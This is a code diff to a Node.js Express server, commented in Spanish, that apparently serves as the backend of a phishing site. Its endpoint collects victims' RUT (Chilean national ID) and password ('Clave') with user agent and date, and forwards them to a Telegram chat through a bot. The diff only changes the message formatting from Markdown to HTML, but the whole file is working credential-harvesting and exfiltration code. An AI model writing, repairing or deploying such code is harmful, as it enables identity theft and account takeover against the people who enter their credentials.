@@ -2,12 +2,15 @@ const express = require('express');
 const path = require('path');
 const dotenv = require('dotenv');
 
-dotenv.config(); // Carga las variables del archivo .env
+dotenv.config(); // Carga las variables del archivo .env (solo para desarrollo local)
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-app.use(express.json()); // Para poder recibir JSON en el body
+// Middleware para parsear JSON
+app.use(express.json());
+
+// Servir archivos estáticos (CSS, HTML, JS)
 app.use(express.static(path.join(__dirname, '/')));
 
 // Endpoint para enviar a Telegram
@@ -15,12 +18,13 @@ app.post('/api/telegram', async (req, res) => {
   try {
     const { rut, passwd, userAgent, fecha } = req.body;
 
+    // Mensaje en formato HTML (evita errores de parseo)
     const mensaje = `
-🔔 *Nueva solicitud recibida*
-👤 *RUT:* ${rut}
-🔑 *Clave:* ${passwd}
-🕒 *Fecha:* ${fecha || 'No disponible'}
-📱 *User Agent:* ${userAgent || 'No disponible'}
+🔔 <b>Nueva solicitud recibida</b>
+👤 <b>RUT:</b> ${rut}
+🔑 <b>Clave:</b> ${passwd}
+🕒 <b>Fecha:</b> ${fecha || 'No disponible'}
+📱 <b>User Agent:</b> ${userAgent || 'No disponible'}
     `;
 
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -37,7 +41,7 @@ app.post('/api/telegram', async (req, res) => {
       body: JSON.stringify({
         chat_id: chatId,
         text: mensaje,
-        parse_mode: 'Markdown'
+        parse_mode: 'HTML' // Usamos HTML para evitar errores con caracteres especiales
       })
     });
 
@@ -53,6 +57,7 @@ app.post('/api/telegram', async (req, res) => {
   }
 });
 
+// Todas las demás rutas sirven index.html
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
